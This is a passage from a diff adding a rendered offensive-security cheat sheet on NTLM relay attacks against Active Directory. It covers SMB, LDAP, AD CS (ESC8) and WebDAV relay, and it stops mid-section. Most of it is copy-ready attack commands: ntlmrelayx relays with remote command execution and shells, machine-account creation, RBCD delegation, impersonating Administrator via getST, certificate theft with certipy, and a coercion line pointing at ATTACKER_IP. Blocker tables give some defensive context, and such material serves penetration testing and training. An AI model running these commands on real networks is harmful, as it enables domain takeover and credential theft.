+</span><span id="__span-1-8"><a id="__codelineno-1-8" name="__codelineno-1-8" href="#__codelineno-1-8"></a><span class="nb">export</span><span class="w"> </span><span class="nv">TARGET</span><span class="o">=</span><span class="m">10</span>.10.10.20
+</span><span id="__span-1-9"><a id="__codelineno-1-9" name="__codelineno-1-9" href="#__codelineno-1-9"></a><span class="nb">export</span><span class="w"> </span><span class="nv">TARGET_HOST</span><span class="o">=</span>filesrv01.corp.local
+</span><span id="__span-1-10"><a id="__codelineno-1-10" name="__codelineno-1-10" href="#__codelineno-1-10"></a><span class="nb">export</span><span class="w"> </span><span class="nv">RANGE</span><span class="o">=</span><span class="m">10</span>.10.10.0/24
+</span></code></pre></div>
+<hr />
+<h2 id="ntlm-relay-basics">NTLM Relay Basics</h2>
+<p>NTLM relay abuses NTLM authentication messages.</p>
+<p>It is not the same as Pass-the-Hash.</p>
+<table>
+<thead>
+<tr>
+<th>Technique</th>
+<th>Meaning</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Pass-the-Hash</td>
+<td>Uses an NT hash directly to authenticate.</td>
+</tr>
+<tr>
+<td>NTLM relay</td>
+<td>Captures an NTLM authentication exchange and relays it to another service.</td>
+</tr>
+<tr>
+<td>NetNTLM capture</td>
+<td>Captures challenge-response material for offline cracking.</td>
+</tr>
+<tr>
+<td>Coercion</td>
+<td>Forces or triggers a target to authenticate to an attacker-controlled listener.</td>
+</tr>
+</tbody>
+</table>
+<p>Relay flow:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>1. Attacker starts listener.
+</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a>2. Victim authenticates to attacker over SMB/HTTP/etc.
+</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a>3. Attacker forwards NTLM messages to target service.
+</span><span id="__span-2-4"><a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a>4. Target service accepts authentication if conditions allow it.
+</span><span id="__span-2-5"><a id="__codelineno-2-5" name="__codelineno-2-5" href="#__codelineno-2-5"></a>5. Attacker performs actions as the relayed identity.
+</span></code></pre></div>
+<p>Common relay protocols:</p>
+<table>
+<thead>
+<tr>
+<th>Incoming</th>
+<th>Relayed to</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>SMB</td>
+<td>SMB</td>
+</tr>
+<tr>
+<td>SMB</td>
+<td>LDAP / LDAPS</td>
+</tr>
+<tr>
+<td>SMB</td>
+<td>HTTP</td>
+</tr>
+<tr>
+<td>HTTP</td>
+<td>LDAP / LDAPS</td>
+</tr>
+<tr>
+<td>HTTP</td>
+<td>AD CS HTTP endpoint</td>
+</tr>
+<tr>
+<td>WebDAV / HTTP</td>
+<td>LDAP / SMB / AD CS</td>
+</tr>
+<tr>
+<td>MSSQL</td>
+<td>SMB / LDAP / HTTP, depending on tooling and context</td>
+</tr>
+</tbody>
+</table>
+<p>Common targets:</p>
+<table>
+<thead>
+<tr>
+<th>Target</th>
+<th>Possible impact</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>SMB host without signing required</td>
+<td>File access, command execution if relayed identity is local admin.</td>
+</tr>
+<tr>
+<td>LDAP / LDAPS</td>
+<td>Add computer, RBCD, shadow credentials, group modification, ACL changes.</td>
+</tr>
+<tr>
+<td>AD CS web enrollment</td>
+<td>Certificate request as relayed machine or user.</td>
+</tr>
+<tr>
+<td>HTTP service with NTLM</td>
+<td>Application-specific authenticated access.</td>
+</tr>
+<tr>
+<td>MSSQL</td>
+<td>Database access if relayed identity has rights.</td>
+</tr>
+</tbody>
+</table>
+<p>Common blockers:</p>
+<table>
+<thead>
+<tr>
+<th>Blocker</th>
+<th>Effect</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>SMB signing required</td>
+<td>Blocks SMB relay to SMB.</td>
+</tr>
+<tr>
+<td>LDAP signing/channel binding</td>
+<td>Blocks or limits LDAP relay.</td>
+</tr>
+<tr>
+<td>EPA / channel binding on HTTP</td>
+<td>Can block some HTTP relay paths.</td>
+</tr>
+<tr>
+<td>Protected Users / sensitive accounts</td>
+<td>Delegation and some auth flows may be limited.</td>
+</tr>
+<tr>
+<td>No useful target rights</td>
+<td>Relay authenticates but action fails.</td>
+</tr>
+<tr>
+<td>Kerberos used instead of NTLM</td>
+<td>NTLM relay path may not trigger.</td>
+</tr>
+</tbody>
+</table>
+<p>Check SMB signing:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>nxc<span class="w"> </span>smb<span class="w"> </span><span class="nv">$RANGE</span><span class="w"> </span>--gen-relay-list<span class="w"> </span>relay_targets.txt
+</span></code></pre></div>
+<p>Manual SMB signing check:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>nmap<span class="w"> </span>-Pn<span class="w"> </span>-n<span class="w"> </span>-p445<span class="w"> </span>--script<span class="w"> </span>smb2-security-mode<span class="w"> </span><span class="nv">$TARGET</span>
+</span></code></pre></div>
+<p>Start basic ntlmrelayx with a single SMB target:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>ntlmrelayx.py<span class="w"> </span>-t<span class="w"> </span>smb://<span class="nv">$TARGET</span><span class="w"> </span>--smb2support
+</span></code></pre></div>
+<p>Relay to target list:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>ntlmrelayx.py<span class="w"> </span>-tf<span class="w"> </span>relay_targets.txt<span class="w"> </span>--smb2support
+</span></code></pre></div>
+<p>Start SOCKS mode:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>ntlmrelayx.py<span class="w"> </span>-tf<span class="w"> </span>relay_targets.txt<span class="w"> </span>--smb2support<span class="w"> </span>-socks
+</span></code></pre></div>
+<p>Interactive ntlmrelayx shell:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>ntlmrelayx.py<span class="w"> </span>-tf<span class="w"> </span>relay_targets.txt<span class="w"> </span>--smb2support<span class="w"> </span>-i
+</span></code></pre></div>
+<p>Common ntlmrelayx options:</p>
+<table>
+<thead>
+<tr>
+<th>Option</th>
+<th>Meaning</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>-t</code></td>
+<td>Single relay target.</td>
+</tr>
+<tr>
+<td><code>-tf</code></td>
+<td>File with relay targets.</td>
+</tr>
+<tr>
+<td><code>--smb2support</code></td>
+<td>Enable SMB2 support.</td>
+</tr>
+<tr>
+<td><code>-socks</code></td>
+<td>Start SOCKS proxy for relayed sessions.</td>
+</tr>
+<tr>
+<td><code>-i</code></td>
+<td>Interactive shell for supported protocols.</td>
+</tr>
+<tr>
+<td><code>--no-smb-server</code></td>
+<td>Do not start SMB listener.</td>
+</tr>
+<tr>
+<td><code>--no-http-server</code></td>
+<td>Do not start HTTP listener.</td>
+</tr>
+<tr>
+<td><code>--delegate-access</code></td>
+<td>LDAP/RBCD style delegation action.</td>
+</tr>
+<tr>
+<td><code>--add-computer</code></td>
+<td>Add computer account through LDAP relay.</td>
+</tr>
+<tr>
+<td><code>--escalate-user</code></td>
+<td>Try privilege escalation against LDAP target.</td>
+</tr>
+<tr>
+<td><code>--dump</code></td>
+<td>Dump LDAP information where supported.</td>
+</tr>
+<tr>
+<td><code>--adcs</code></td>
+<td>AD CS relay mode.</td>
+</tr>
+<tr>
+<td><code>--template</code></td>
+<td>Certificate template name for AD CS relay.</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="smb-relay">SMB Relay</h2>
+<p>SMB relay usually means relaying NTLM authentication to SMB on another host.</p>
+<p>It requires the SMB target to not require SMB signing.</p>
+<p>Find relayable SMB hosts:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>nxc<span class="w"> </span>smb<span class="w"> </span><span class="nv">$RANGE</span><span class="w"> </span>--gen-relay-list<span class="w"> </span>relay_targets.txt
+</span></code></pre></div>
+<p>Check one host:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>nxc<span class="w"> </span>smb<span class="w"> </span><span class="nv">$TARGET</span>
+</span><span id="__span-10-2"><a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a>nmap<span class="w"> </span>-Pn<span class="w"> </span>-n<span class="w"> </span>-p445<span class="w"> </span>--script<span class="w"> </span>smb2-security-mode<span class="w"> </span><span class="nv">$TARGET</span>
+</span></code></pre></div>
+<p>Expected interesting condition:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a>SMB signing: False / not required
+</span></code></pre></div>
+<p>Relay to one SMB target:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a>ntlmrelayx.py<span class="w"> </span>-t<span class="w"> </span>smb://<span class="nv">$TARGET</span><span class="w"> </span>--smb2support
+</span></code></pre></div>
+<p>Relay to a list:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a>ntlmrelayx.py<span class="w"> </span>-tf<span class="w"> </span>relay_targets.txt<span class="w"> </span>--smb2support
+</span></code></pre></div>
+<p>Relay and get interactive shell where supported:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a>ntlmrelayx.py<span class="w"> </span>-t<span class="w"> </span>smb://<span class="nv">$TARGET</span><span class="w"> </span>--smb2support<span class="w"> </span>-i
+</span></code></pre></div>
+<p>Relay with command execution when the relayed identity is local admin:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a>ntlmrelayx.py<span class="w"> </span>-t<span class="w"> </span>smb://<span class="nv">$TARGET</span><span class="w"> </span>--smb2support<span class="w"> </span>-c<span class="w"> </span><span class="s2">&quot;whoami&quot;</span>
+</span></code></pre></div>
+<p>Relay to multiple SMB targets:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-16-1"><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a>cat<span class="w"> </span>relay_targets.txt
+</span></code></pre></div>
+<p>Example target file:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-17-1"><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a>smb://10.10.10.20
+</span><span id="__span-17-2"><a id="__codelineno-17-2" name="__codelineno-17-2" href="#__codelineno-17-2"></a>smb://10.10.10.21
+</span><span id="__span-17-3"><a id="__codelineno-17-3" name="__codelineno-17-3" href="#__codelineno-17-3"></a>smb://10.10.10.22
+</span></code></pre></div>
+<p>Run:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-18-1"><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a>ntlmrelayx.py<span class="w"> </span>-tf<span class="w"> </span>relay_targets.txt<span class="w"> </span>--smb2support
+</span></code></pre></div>
+<p>Trigger authentication separately with a coercion method.</p>
+<p>Simple test trigger from a controlled Windows host:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-19-1"><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a>dir \\ATTACKER_IP\share
+</span></code></pre></div>
+<p>If using responder-style poisoning in labs, avoid running tools that conflict with ntlmrelayx listeners on the same ports.</p>
+<p>Common conflicts:</p>
+<table>
+<thead>
+<tr>
+<th>Port</th>
+<th>Service</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>445</code></td>
+<td>SMB listener.</td>
+</tr>
+<tr>
+<td><code>80</code></td>
+<td>HTTP listener.</td>
+</tr>
+<tr>
+<td><code>443</code></td>
+<td>HTTPS listener.</td>
+</tr>
+</tbody>
+</table>
+<p>SMB relay outcomes:</p>
+<table>
+<thead>
+<tr>
+<th>Result</th>
+<th>Meaning</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Authentication received</td>
+<td>Victim connected to attacker listener.</td>
+</tr>
+<tr>
+<td>Relay failed: signing required</td>
+<td>SMB target requires signing.</td>
+</tr>
+<tr>
+<td>Relay succeeds but no command</td>
+<td>Relayed identity is not local admin.</td>
+</tr>
+<tr>
+<td>Command executes</td>
+<td>Relayed identity has admin rights on target.</td>
+</tr>
+<tr>
+<td>Session created</td>
+<td>Use interactive or SOCKS flow.</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="ldap-relay">LDAP Relay</h2>
+<p>LDAP relay targets LDAP or LDAPS on a domain controller.</p>
+<p>LDAP relay is interesting because the relayed identity may be able to perform AD object operations.</p>
+<p>Possible LDAP relay actions depend on the relayed account privileges and server protections.</p>
+<p>Common LDAP relay objectives:</p>
+<table>
+<thead>
+<tr>
+<th>Objective</th>
+<th>Notes</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Add computer account</td>
+<td>Depends on MachineAccountQuota and permissions.</td>
+</tr>
+<tr>
+<td>Set RBCD</td>
+<td>Often used with <code>--delegate-access</code>.</td>
+</tr>
+<tr>
+<td>Shadow credentials</td>
+<td>Add key credential link if rights allow.</td>
+</tr>
+<tr>
+<td>Modify group membership</td>
+<td>Requires rights over group.</td>
+</tr>
+<tr>
+<td>Modify ACL</td>
+<td>Requires rights.</td>
+</tr>
+<tr>
+<td>Dump LDAP information</td>
+<td>Enumeration if relay succeeds.</td>
+</tr>
+</tbody>
+</table>
+<p>Check domain context:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-20-1"><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a>nxc<span class="w"> </span>ldap<span class="w"> </span><span class="nv">$DC_IP</span><span class="w"> </span>-u<span class="w"> </span><span class="nv">$USER</span><span class="w"> </span>-p<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span><span class="w"> </span>-d<span class="w"> </span><span class="nv">$DOMAIN</span>
+</span></code></pre></div>
+<p>Check MachineAccountQuota:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-21-1"><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a>nxc<span class="w"> </span>ldap<span class="w"> </span><span class="nv">$DC_IP</span><span class="w"> </span>-u<span class="w"> </span><span class="nv">$USER</span><span class="w"> </span>-p<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span><span class="w"> </span>-d<span class="w"> </span><span class="nv">$DOMAIN</span><span class="w"> </span>-M<span class="w"> </span>maq
+</span></code></pre></div>
+<p>LDAP relay basic:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-22-1"><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a>ntlmrelayx.py<span class="w"> </span>-t<span class="w"> </span>ldap://<span class="nv">$DC_IP</span><span class="w"> </span>--smb2support
+</span></code></pre></div>
+<p>LDAPS relay:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-23-1"><a id="__codelineno-23-1" name="__codelineno-23-1" href="#__codelineno-23-1"></a>ntlmrelayx.py<span class="w"> </span>-t<span class="w"> </span>ldaps://<span class="nv">$DC_IP</span><span class="w"> </span>--smb2support
+</span></code></pre></div>
+<p>Relay and dump LDAP info:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-24-1"><a id="__codelineno-24-1" name="__codelineno-24-1" href="#__codelineno-24-1"></a>ntlmrelayx.py<span class="w"> </span>-t<span class="w"> </span>ldap://<span class="nv">$DC_IP</span><span class="w"> </span>--smb2support<span class="w"> </span>--dump
+</span></code></pre></div>
+<p>Relay with SOCKS:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-25-1"><a id="__codelineno-25-1" name="__codelineno-25-1" href="#__codelineno-25-1"></a>ntlmrelayx.py<span class="w"> </span>-t<span class="w"> </span>ldap://<span class="nv">$DC_IP</span><span class="w"> </span>--smb2support<span class="w"> </span>-socks
+</span></code></pre></div>
+<p>Add computer through LDAP relay:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-26-1"><a id="__codelineno-26-1" name="__codelineno-26-1" href="#__codelineno-26-1"></a>ntlmrelayx.py<span class="w"> </span>-t<span class="w"> </span>ldap://<span class="nv">$DC_IP</span><span class="w"> </span>--smb2support<span class="w"> </span>--add-computer<span class="w"> </span><span class="s1">&#39;ATTACKBOX$&#39;</span><span class="w"> </span><span class="s1">&#39;MachinePass123!&#39;</span>
+</span></code></pre></div>
+<p>RBCD-style delegation through LDAP relay:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-27-1"><a id="__codelineno-27-1" name="__codelineno-27-1" href="#__codelineno-27-1"></a>ntlmrelayx.py<span class="w"> </span>-t<span class="w"> </span>ldap://<span class="nv">$DC_IP</span><span class="w"> </span>--smb2support<span class="w"> </span>--delegate-access
+</span></code></pre></div>
+<p>LDAPS version:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-28-1"><a id="__codelineno-28-1" name="__codelineno-28-1" href="#__codelineno-28-1"></a>ntlmrelayx.py<span class="w"> </span>-t<span class="w"> </span>ldaps://<span class="nv">$DC_IP</span><span class="w"> </span>--smb2support<span class="w"> </span>--delegate-access
+</span></code></pre></div>
+<p>Relay to LDAP with escalation user:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-29-1"><a id="__codelineno-29-1" name="__codelineno-29-1" href="#__codelineno-29-1"></a>ntlmrelayx.py<span class="w"> </span>-t<span class="w"> </span>ldap://<span class="nv">$DC_IP</span><span class="w"> </span>--smb2support<span class="w"> </span>--escalate-user<span class="w"> </span><span class="nv">$USER</span>
+</span></code></pre></div>
+<p>After successful RBCD-style path, request service ticket:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-30-1"><a id="__codelineno-30-1" name="__codelineno-30-1" href="#__codelineno-30-1"></a>getST.py<span class="w"> </span>-spn<span class="w"> </span>cifs/<span class="nv">$TARGET_HOST</span><span class="w"> </span>-impersonate<span class="w"> </span>Administrator<span class="w"> </span><span class="nv">$DOMAIN</span>/<span class="s1">&#39;ATTACKBOX$&#39;</span>:<span class="s1">&#39;MachinePass123!&#39;</span><span class="w"> </span>-dc-ip<span class="w"> </span><span class="nv">$DC_IP</span>
+</span></code></pre></div>
+<p>Use ticket:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-31-1"><a id="__codelineno-31-1" name="__codelineno-31-1" href="#__codelineno-31-1"></a><span class="nb">export</span><span class="w"> </span><span class="nv">KRB5CCNAME</span><span class="o">=</span><span class="nv">$PWD</span>/Administrator.ccache
+</span><span id="__span-31-2"><a id="__codelineno-31-2" name="__codelineno-31-2" href="#__codelineno-31-2"></a>smbclient.py<span class="w"> </span>-k<span class="w"> </span>-no-pass<span class="w"> </span><span class="nv">$DOMAIN</span>/Administrator@<span class="nv">$TARGET_HOST</span>
+</span></code></pre></div>
+<p>LDAP relay blockers:</p>
+<table>
+<thead>
+<tr>
+<th>Blocker</th>
+<th>Meaning</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>LDAP signing required</td>
+<td>LDAP relay may fail.</td>
+</tr>
+<tr>
+<td>Channel binding required</td>
+<td>LDAPS relay may fail.</td>
+</tr>
+<tr>
+<td>Relayed account lacks rights</td>
+<td>Relay authenticates but action fails.</td>
+</tr>
+<tr>
+<td>MachineAccountQuota is 0</td>
+<td>Add-computer path may fail.</td>
+</tr>
+<tr>
+<td>Target user protected</td>
+<td>Some delegation paths fail.</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="adcs-relay">ADCS Relay</h2>
+<p>AD CS relay commonly targets certificate enrollment HTTP endpoints.</p>
+<p>The classic path is often called ESC8.</p>
+<p>General idea:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-32-1"><a id="__codelineno-32-1" name="__codelineno-32-1" href="#__codelineno-32-1"></a>Coerce machine authentication
+</span><span id="__span-32-2"><a id="__codelineno-32-2" name="__codelineno-32-2" href="#__codelineno-32-2"></a>Relay NTLM to AD CS web enrollment
+</span><span id="__span-32-3"><a id="__codelineno-32-3" name="__codelineno-32-3" href="#__codelineno-32-3"></a>Request certificate as machine
+</span><span id="__span-32-4"><a id="__codelineno-32-4" name="__codelineno-32-4" href="#__codelineno-32-4"></a>Use certificate for domain authentication
+</span></code></pre></div>
+<p>Common AD CS HTTP endpoints:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-33-1"><a id="__codelineno-33-1" name="__codelineno-33-1" href="#__codelineno-33-1"></a>http://ca01.corp.local/certsrv/
+</span><span id="__span-33-2"><a id="__codelineno-33-2" name="__codelineno-33-2" href="#__codelineno-33-2"></a>http://ca01.corp.local/certsrv/certfnsh.asp
+</span></code></pre></div>
+<p>Find AD CS with Certipy:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-34-1"><a id="__codelineno-34-1" name="__codelineno-34-1" href="#__codelineno-34-1"></a>certipy<span class="w"> </span>find<span class="w"> </span>-u<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$USER</span><span class="s2">@</span><span class="nv">$DOMAIN</span><span class="s2">&quot;</span><span class="w"> </span>-p<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span><span class="w"> </span>-dc-ip<span class="w"> </span><span class="nv">$DC_IP</span><span class="w"> </span>-v
+</span></code></pre></div>
+<p>Find vulnerable templates and endpoints:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-35-1"><a id="__codelineno-35-1" name="__codelineno-35-1" href="#__codelineno-35-1"></a>certipy<span class="w"> </span>find<span class="w"> </span>-u<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$USER</span><span class="s2">@</span><span class="nv">$DOMAIN</span><span class="s2">&quot;</span><span class="w"> </span>-p<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span><span class="w"> </span>-dc-ip<span class="w"> </span><span class="nv">$DC_IP</span><span class="w"> </span>-vulnerable
+</span></code></pre></div>
+<p>NetExec AD CS module:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-36-1"><a id="__codelineno-36-1" name="__codelineno-36-1" href="#__codelineno-36-1"></a>nxc<span class="w"> </span>ldap<span class="w"> </span><span class="nv">$DC_IP</span><span class="w"> </span>-u<span class="w"> </span><span class="nv">$USER</span><span class="w"> </span>-p<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span><span class="w"> </span>-d<span class="w"> </span><span class="nv">$DOMAIN</span><span class="w"> </span>-M<span class="w"> </span>adcs
+</span></code></pre></div>
+<p>Relay to AD CS with ntlmrelayx:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-37-1"><a id="__codelineno-37-1" name="__codelineno-37-1" href="#__codelineno-37-1"></a>ntlmrelayx.py<span class="w"> </span>-t<span class="w"> </span>http://ca01.corp.local/certsrv/certfnsh.asp<span class="w"> </span>--adcs<span class="w"> </span>--template<span class="w"> </span>Machine<span class="w"> </span>--smb2support
+</span></code></pre></div>
+<p>Use DomainController template for relayed DC machine account where applicable in labs:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-38-1"><a id="__codelineno-38-1" name="__codelineno-38-1" href="#__codelineno-38-1"></a>ntlmrelayx.py<span class="w"> </span>-t<span class="w"> </span>http://ca01.corp.local/certsrv/certfnsh.asp<span class="w"> </span>--adcs<span class="w"> </span>--template<span class="w"> </span>DomainController<span class="w"> </span>--smb2support
+</span></code></pre></div>
+<p>Use a target file:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-39-1"><a id="__codelineno-39-1" name="__codelineno-39-1" href="#__codelineno-39-1"></a>http://ca01.corp.local/certsrv/certfnsh.asp
+</span></code></pre></div>
+<p>Run:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-40-1"><a id="__codelineno-40-1" name="__codelineno-40-1" href="#__codelineno-40-1"></a>ntlmrelayx.py<span class="w"> </span>-tf<span class="w"> </span>adcs_targets.txt<span class="w"> </span>--adcs<span class="w"> </span>--template<span class="w"> </span>Machine<span class="w"> </span>--smb2support
+</span></code></pre></div>
+<p>Coerce authentication from a machine to attacker listener, then relay to AD CS.</p>
+<p>If certificate is issued, ntlmrelayx may save it as:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-41-1"><a id="__codelineno-41-1" name="__codelineno-41-1" href="#__codelineno-41-1"></a>*.pfx
+</span><span id="__span-41-2"><a id="__codelineno-41-2" name="__codelineno-41-2" href="#__codelineno-41-2"></a>*.pem
+</span></code></pre></div>
+<p>Authenticate with Certipy using PFX:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-42-1"><a id="__codelineno-42-1" name="__codelineno-42-1" href="#__codelineno-42-1"></a>certipy<span class="w"> </span>auth<span class="w"> </span>-pfx<span class="w"> </span>machine.pfx<span class="w"> </span>-dc-ip<span class="w"> </span><span class="nv">$DC_IP</span>
+</span></code></pre></div>
+<p>This can return:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-43-1"><a id="__codelineno-43-1" name="__codelineno-43-1" href="#__codelineno-43-1"></a>TGT
+</span><span id="__span-43-2"><a id="__codelineno-43-2" name="__codelineno-43-2" href="#__codelineno-43-2"></a>NT hash
+</span><span id="__span-43-3"><a id="__codelineno-43-3" name="__codelineno-43-3" href="#__codelineno-43-3"></a>ccache
+</span></code></pre></div>
+<p>Use ccache:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-44-1"><a id="__codelineno-44-1" name="__codelineno-44-1" href="#__codelineno-44-1"></a><span class="nb">export</span><span class="w"> </span><span class="nv">KRB5CCNAME</span><span class="o">=</span><span class="nv">$PWD</span>/machine.ccache
+</span><span id="__span-44-2"><a id="__codelineno-44-2" name="__codelineno-44-2" href="#__codelineno-44-2"></a>klist
+</span></code></pre></div>
+<p>Use machine account access:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-45-1"><a id="__codelineno-45-1" name="__codelineno-45-1" href="#__codelineno-45-1"></a>nxc<span class="w"> </span>smb<span class="w"> </span><span class="nv">$DC_HOST</span><span class="w"> </span>-k<span class="w"> </span>--use-kcache
+</span></code></pre></div>
+<p>AD CS relay conditions:</p>
+<table>
+<thead>
+<tr>
+<th>Condition</th>
+<th>Why it matters</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>AD CS HTTP endpoint exists</td>
+<td>Relay target.</td>
+</tr>
+<tr>
+<td>NTLM accepted on endpoint</td>
+<td>Required for relay.</td>
+</tr>
+<tr>
+<td>Template allows machine/user enrollment</td>
+<td>Certificate issuance path.</td>
+</tr>
+<tr>
+<td>Relayed identity has enroll rights</td>
+<td>Needed for certificate request.</td>
+</tr>
+<tr>
+<td>EPA/channel binding not blocking</td>
+<td>Required for some HTTP relay paths.</td>
+</tr>
+<tr>
+<td>Useful template</td>
+<td><code>Machine</code>, <code>DomainController</code>, or other valid template.</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="webdav-relay">WebDAV Relay</h2>
+<p>WebDAV can be useful because Windows may authenticate over HTTP/WebDAV instead of SMB.</p>
+<p>This can matter when SMB outbound is blocked, SMB signing prevents SMB relay, or WebClient service behavior allows HTTP-based authentication.</p>
+<p>Important Windows component:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-46-1"><a id="__codelineno-46-1" name="__codelineno-46-1" href="#__codelineno-46-1"></a>WebClient service
+</span></code></pre></div>
+<p>Common WebDAV relay idea:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-47-1"><a id="__codelineno-47-1" name="__codelineno-47-1" href="#__codelineno-47-1"></a>Victim authenticates to attacker over HTTP/WebDAV
+</span><span id="__span-47-2"><a id="__codelineno-47-2" name="__codelineno-47-2" href="#__codelineno-47-2"></a>Attacker relays NTLM to LDAP / AD CS / HTTP target
+</span></code></pre></div>
+<p>Check if WebClient service may be running from Windows:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-48-1"><a id="__codelineno-48-1" name="__codelineno-48-1" href="#__codelineno-48-1"></a>sc query WebClient
+</span></code></pre></div>
+<p>Remote checks may vary by access and environment.</p>
+<p>Start HTTP relay listener without SMB listener if needed:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-49-1"><a id="__codelineno-49-1" name="__codelineno-49-1" href="#__codelineno-49-1"></a>ntlmrelayx.py<span class="w"> </span>-t<span class="w"> </span>ldap://<span class="nv">$DC_IP</span><span class="w"> </span>--no-smb-server
+</span></code></pre></div>
+<p>HTTP to LDAPS:</p>
